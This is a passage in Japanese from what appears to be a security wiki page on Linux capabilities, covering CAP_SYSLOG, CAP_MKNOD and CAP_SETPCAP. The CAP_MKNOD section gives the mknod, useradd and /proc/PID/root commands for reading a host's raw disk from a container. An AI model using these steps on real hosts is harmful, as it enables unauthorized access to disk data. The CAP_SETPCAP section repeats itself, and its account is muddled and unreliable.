さらに、**CAP_SYSLOG**は、`dmesg_restrict`が1に設定されている場合に`dmesg`出力にアクセスを許可します。これらの変更にもかかわらず、歴史的な先例により、**CAP_SYS_ADMIN**は引き続き`syslog`操作を実行できます。

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、`mknod`システムコールの機能を拡張し、通常のファイル、FIFO（名前付きパイプ）、またはUNIXドメインソケットの作成を超えて、特殊ファイルの作成を許可します。これには次のものが含まれます：

- **S_IFCHR**：端末などのキャラクタ特殊ファイル
- **S_IFBLK**：ディスクなどのブロック特殊ファイル

この機能は、デバイスファイルを作成する必要があるプロセスにとって重要であり、キャラクタまたはブロックデバイスを介した直接的なハードウェアのやり取りを容易にします。

これはデフォルトのdocker機能です（[https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。

この機能により、次の条件下でホスト上で特権昇格（完全なディスク読み取りを介して）を行うことができます：

1. ホストへの初期アクセス（特権なし）を持つこと。
2. コンテナへの初期アクセス（特権（EUID 0）および有効な`CAP_MKNOD`）を持つこと。
3. ホストとコンテナが同じユーザ名前空間を共有していること。

**コンテナ内でブロックデバイスを作成およびアクセスする手順:**

1. **標準ユーザーとしてホスト上で:**
- `id`を使用して現在のユーザーIDを特定します。例：`uid=1000(standarduser)`。
- 対象デバイスを特定します。例：`/dev/sdb`。

2. **`root`としてコンテナ内で:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **ホストに戻ります:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
### CAP\_SETPCAP

**CAP_SETPCAP**は、プロセスが他のプロセスの**権限セットを変更**できるようにする機能であり、効果的な、継承可能な、許可されたセットから権限を追加または削除することが可能です。ただし、プロセスは自身の許可されたセット内にある権限のみを変更でき、他のプロセスの特権を自身のもの以上に昇格させることはできません。最近のカーネルの更新により、これらのルールが強化され、`CAP_SETPCAP`が自身またはその子孫の許可されたセット内の権限を減らすだけに制限され、セキュリティリスクを軽減することを目指しています。使用するには、効果的なセットに`CAP_SETPCAP`を持ち、対象の権限を許可されたセットに持つ必要があり、変更には`capset()`を利用します。これは`CAP_SETPCAP`の主な機能と制限を要約し、特権管理とセキュリティ強化における役割を強調しています。

**`CAP_SETPCAP`**は、Linuxの機能であり、プロセスが**他のプロセスの権限セットを変更**できるようにします。他のプロセスの効果的な、継承可能な、許可された権限セットから権限を追加または削除する機能を提供します。ただし、この機能の使用にはいくつかの制限があります。

`CAP_SETPCAP`を持つプロセスは、**自身の許可された権限セット内にある権限のみを付与または削除できます**。つまり、プロセスは自身が持っていない権限を他のプロセスに付与することはできません。この制限により、プロセスは他のプロセスの特権を自身の特権レベルを超えて昇格させることを防ぎます。

さらに、最近のカーネルバージョンでは、`CAP_SETPCAP`機能が**さらに制限されています**。プロセスは他のプロセスの権限セットを任意に変更することはできず、**自身の許可された権限セットまたはその子孫の許可された権限セット内の権限を減らすことだけが許可**されています。この変更は、権限に関連する潜在的なセキュリティリスクを減らすために導入されました。

`CAP_SETPCAP`を効果的に使用するには、効果的な権限セットに機能を持ち、対象の権限を許可された権限セットに持つ必要があります。その後、`capset()`システムコールを使用して他のプロセスの権限セットを変更できます。

要するに、`CAP_SETPCAP`はプロセスが他のプロセスの権限セットを変更できる機能ですが、自身が持っていない権限を付与することはできません。さらに、セキュリティ上の懸念から、最近のカーネルバージョンでは、その機能が自身の許可された権限セットまたはその子孫の許可された権限セット内の権限を減らすことだけを許可するように制限されています。
